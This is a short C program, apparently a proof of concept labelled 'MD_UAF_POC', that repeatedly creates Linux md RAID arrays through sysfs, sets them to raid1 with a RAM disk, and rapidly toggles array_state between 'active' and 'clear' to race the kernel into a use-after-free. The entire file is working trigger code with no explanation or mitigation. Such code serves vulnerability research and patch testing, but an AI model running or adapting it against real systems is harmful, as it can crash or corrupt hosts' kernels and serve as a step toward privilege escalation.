#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/stat.h>

static int wr(const char *p, const char *v)
{
    int fd = open(p, O_WRONLY);
    if (fd < 0)
        return -1;
    ssize_t n = write(fd, v, strlen(v));
    int e = errno;
    close(fd);
    if (n < 0) { errno = e; return -1; }
    return 0;
}

int main(int argc, char **argv)
{
    int rounds = argc > 1 ? atoi(argv[1]) : 200;
    printf("MD_UAF_POC start uid=%d rounds=%d\n", getuid(), rounds);
    fflush(stdout);

    for (int i = 0; i < rounds; i++) {
        char base[64];
        snprintf(base, sizeof(base), "md%d", i);

        int fd = open("/sys/module/md_mod/parameters/new_array", O_WRONLY);
        if (fd < 0) {
            printf("FAIL open new_array errno=%d\n", errno);
            break;
        }
        if (write(fd, base, strlen(base)) < 0) {
            printf("FAIL write new_array errno=%d\n", errno);
            close(fd);
            break;
        }
        close(fd);

        char p[128];
        snprintf(p, sizeof(p), "/sys/block/%s/md/level", base);
        if (wr(p, "raid1") < 0 && errno != EBUSY)
            ; 

        snprintf(p, sizeof(p), "/sys/block/%s/md/raid_disks", base);
        wr(p, "1");

        snprintf(p, sizeof(p), "/sys/block/%s/md/dev-ram0/slot", base);
        wr(p, "0");

        snprintf(p, sizeof(p), "/sys/block/%s/md/array_state", base);
        int a = wr(p, "active");

        usleep(2000);

        int c = wr(p, "clear");
        int ce = errno;

        if (i < 3 || c < 0)
            printf("round=%d active=%d clear=%d(errno=%d)\n", i, a, c, c < 0 ? ce : 0);
        fflush(stdout);

        usleep(2000);
    }

    printf("MD_UAF_POC done\n");
    fflush(stdout);
    return 0;
}